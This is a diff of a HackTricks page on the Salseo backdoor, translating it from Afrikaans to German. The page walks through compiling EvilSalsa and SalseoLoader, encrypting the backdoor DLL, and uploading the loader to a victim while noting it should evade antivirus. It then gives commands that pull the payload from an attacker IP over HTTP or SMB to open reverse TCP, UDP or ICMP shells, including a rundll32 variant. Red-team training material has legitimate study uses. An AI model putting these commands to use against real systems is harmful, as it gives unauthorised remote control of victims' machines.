@@ -1,39 +1,39 @@
 # Salseo
 
 {% hint style="success" %}
-Leer & oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
-## Kompilering van die bineêre lêers
+## Kompilieren der Binaries
 
-Laai die bronkode van die github af en kompileer **EvilSalsa** en **SalseoLoader**. Jy sal **Visual Studio** geïnstalleer moet hê om die kode te kompileer.
+Laden Sie den Quellcode von GitHub herunter und kompilieren Sie **EvilSalsa** und **SalseoLoader**. Sie benötigen **Visual Studio**, um den Code zu kompilieren.
 
-Kompileer daardie projekte vir die argitektuur van die Windows-boks waar jy hulle gaan gebruik (As die Windows x64 ondersteun, kompileer hulle vir daardie argitekture).
+Kompilieren Sie diese Projekte für die Architektur des Windows-Systems, auf dem Sie sie verwenden möchten (Wenn Windows x64 unterstützt, kompilieren Sie sie für diese Architektur).
 
-Jy kan die argitektuur **kies** binne Visual Studio in die **linker "Bou" Tab** in **"Platform Teiken".**
+Sie können **die Architektur auswählen** innerhalb von Visual Studio im **linken "Build"-Tab** unter **"Platform Target".**
 
-(\*\*As jy nie hierdie opsies kan vind nie, druk in **"Projek Tab"** en dan in **"\<Projek Naam> Eienskappe"**)
+(\*\*Wenn Sie diese Optionen nicht finden können, klicken Sie auf **"Project Tab"** und dann auf **"\<Projektname> Eigenschaften"**)
 
 ![](<../.gitbook/assets/image (132).png>)
 
-Bou dan beide projekte (Bou -> Bou Oplossing) (Binne die logs sal die pad van die uitvoerbare lêer verskyn):
+Bauen Sie dann beide Projekte (Build -> Build Solution) (Im Protokoll wird der Pfad der ausführbaren Datei angezeigt):
 
 ![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
 
-## Berei die Agterdeur voor
+## Bereiten Sie die Hintertür vor
 
-Eerstens, sal jy die **EvilSalsa.dll** moet kodeer. Om dit te doen, kan jy die python-skrip **encrypterassembly.py** gebruik of jy kan die projek **EncrypterAssembly** kompileer:
+Zuerst müssen Sie die **EvilSalsa.dll** kodieren. Dazu können Sie das Python-Skript **encrypterassembly.py** verwenden oder das Projekt **EncrypterAssembly** kompilieren:
 
 ### **Python**
 ```
@@ -45,110 +45,110 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ok, nou het jy alles wat jy nodig het om al die Salseo ding uit te voer: die **geënkripteerde EvilDalsa.dll** en die **binêre van SalseoLoader.**
+Ok, jetzt hast du alles, was du brauchst, um das gesamte Salseo-Ding auszuführen: die **kodierte EvilDalsa.dll** und die **Binärdatei von SalseoLoader.**
 
-**Laai die SalseoLoader.exe binêre na die masjien op. Dit behoort nie deur enige AV opgespoor te word nie...**
+**Lade die SalseoLoader.exe-Binärdatei auf die Maschine hoch. Sie sollten von keinem AV erkannt werden...**
 
-## **Voer die agterdeur uit**
+## **Führe die Hintertür aus**
 
-### **Kry 'n TCP-omgekeerde dop (laai geënkripteerde dll af deur HTTP)**
+### **Erhalte eine TCP-Reverse-Shell (kodierte DLL über HTTP herunterladen)**
 
-Onthou om 'n nc as die omgekeerde dop luisteraar te begin en 'n HTTP-bediener om die geënkripteerde evilsalsa te dien.
+Denke daran, eine nc als Reverse-Shell-Listener und einen HTTP-Server zu starten, um das kodierte evilsalsa bereitzustellen.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Kry 'n UDP-omgekeerde dop (afgelaaide gekodeerde dll deur SMB)**
+### **Einen UDP-Reverse-Shell erhalten (kodierte DLL über SMB herunterladen)**
 
-Onthou om 'n nc te begin as die omgekeerde dop luisteraar, en 'n SMB-bediener om die gekodeerde evilsalsa te dien (impacket-smbserver).
+Denken Sie daran, ein nc als Reverse-Shell-Listener zu starten und einen SMB-Server, um das kodierte evilsalsa (impacket-smbserver) bereitzustellen.
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Kry 'n ICMP omgekeerde dop (geënkripteerde dll reeds binne die slagoffer)**
+### **Einen ICMP Reverse Shell erhalten (kodierte DLL bereits im Opfer)**
 
-**Hierdie keer het jy 'n spesiale instrument in die klient nodig om die omgekeerde dop te ontvang. Laai af:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Diesmal benötigen Sie ein spezielles Tool auf dem Client, um den Reverse Shell zu empfangen. Laden Sie herunter:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-#### **Deaktiveer ICMP Antwoorde:**
+#### **ICMP-Antworten deaktivieren:**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-#### Voer die klient uit:
+#### Führen Sie den Client aus:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### Binne die slagoffer, laat ons die salseo ding uitvoer:
+#### Im Inneren des Opfers, lassen Sie uns das salseo-Ding ausführen:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## Kompilering van SalseoLoader as DLL wat die hooffunksie uitvoer
+## Kompilieren von SalseoLoader als DLL, die die Hauptfunktion exportiert
 
-Maak die SalseoLoader projek oop met behulp van Visual Studio.
+Öffnen Sie das SalseoLoader-Projekt mit Visual Studio.
 
-### Voeg voor die hooffunksie by: \[DllExport]
+### Fügen Sie vor der Hauptfunktion hinzu: \[DllExport]
 
 ![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-### Installeer DllExport vir hierdie projek
+### Installieren Sie DllExport für dieses Projekt
 
-#### **Gereedskap** --> **NuGet Pakketbestuurder** --> **Bestuur NuGet-pakkette vir Oplossing...**
+#### **Tools** --> **NuGet-Paket-Manager** --> **NuGet-Pakete für die Lösung verwalten...**
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Soek na DllExport-pakket (deur die Blaai-tabblad te gebruik), en druk op Installeer (en aanvaar die popup)**
+#### **Suchen Sie nach dem DllExport-Paket (unter Verwendung des Browsen-Tabs) und drücken Sie Installieren (und akzeptieren Sie das Popup)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-In jou projekmap het die lêers verskyn: **DllExport.bat** en **DllExport\_Configure.bat**
+In Ihrem Projektordner sind die Dateien erschienen: **DllExport.bat** und **DllExport\_Configure.bat**
 
-### **D**eïnstalleer DllExport
+### **De**installieren Sie DllExport
 
-Druk **Deïnstalleer** (ja, dit is vreemd, maar vertrou my, dit is nodig)
+Drücken Sie **Deinstallieren** (ja, es ist seltsam, aber vertrauen Sie mir, es ist notwendig)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-### **Sluit Visual Studio af en voer DllExport\_configure uit**
+### **Beenden Sie Visual Studio und führen Sie DllExport\_configure aus**
 
-Net **sluit** Visual Studio af
+Beenden Sie einfach Visual Studio
 
-Gaan dan na jou **SalseoLoader map** en **voer DllExport\_Configure.bat uit**
+Gehen Sie dann zu Ihrem **SalseoLoader-Ordner** und führen Sie **DllExport\_Configure.bat** aus
 
-Kies **x64** (as jy dit binne 'n x64-boks gaan gebruik, dit was my geval), kies **System.Runtime.InteropServices** (binne **Namespace vir DllExport**) en druk **Toepas**
+Wählen Sie **x64** (wenn Sie es in einer x64-Box verwenden möchten, war das mein Fall), wählen Sie **System.Runtime.InteropServices** (innerhalb von **Namespace für DllExport**) und drücken Sie **Übernehmen**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
-### **Maak die projek weer oop met Visual Studio**
+### **Öffnen Sie das Projekt erneut mit Visual Studio**
 
-**\[DllExport]** behoort nie meer as fout gemerk te wees nie
+**\[DllExport]** sollte nicht länger als Fehler markiert sein
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
-### Bou die oplossing
+### Erstellen Sie die Lösung
 
-Kies **Uitvoertipe = Klasbiblioteek** (Projek --> SalseoLoader Eienskappe --> Toepassing --> Uitvoertipe = Klasbiblioteek)
+Wählen Sie **Ausgabetyp = Klassenbibliothek** (Projekt --> SalseoLoader-Eigenschaften --> Anwendung --> Ausgabetyp = Klassenbibliothek)
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Kies **x64** **platform** (Projek --> SalseoLoader Eienskappe --> Bou --> Platform teiken = x64)
+Wählen Sie die **x64** **Plattform** (Projekt --> SalseoLoader-Eigenschaften --> Erstellen --> Plattformziel = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Om die oplossing te **bou**: Bou --> Bou Oplossing (Binne die Uitvoerkonsole sal die pad van die nuwe DLL verskyn)
+Um die Lösung zu **erstellen**: Erstellen --> Lösung erstellen (Im Ausgabekonsolenfenster wird der Pfad zur neuen DLL angezeigt)
 
-### Toets die gegenereerde Dll
+### Testen Sie die generierte DLL
 
-Kopieer en plak die Dll waar jy dit wil toets.
+Kopieren Sie die DLL und fügen Sie sie dort ein, wo Sie sie testen möchten.
 
-Voer uit:
+Führen Sie aus:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
-Indien geen fout verskyn nie, het jy waarskynlik 'n funksionele DLL!!
+Wenn kein Fehler auftritt, haben Sie wahrscheinlich eine funktionale DLL!!
 
-## Kry 'n skaal deur die DLL te gebruik
+## Holen Sie sich eine Shell mit der DLL
 
-Moenie vergeet om 'n **HTTP** **bediener** te gebruik en 'n **nc** **luisteraar** in te stel
+Vergessen Sie nicht, einen **HTTP** **Server** zu verwenden und einen **nc** **Listener** einzurichten
 
 ### Powershell
 ```
@@ -169,16 +169,16 @@ set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
 {% hint style="success" %}
-Leer & oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
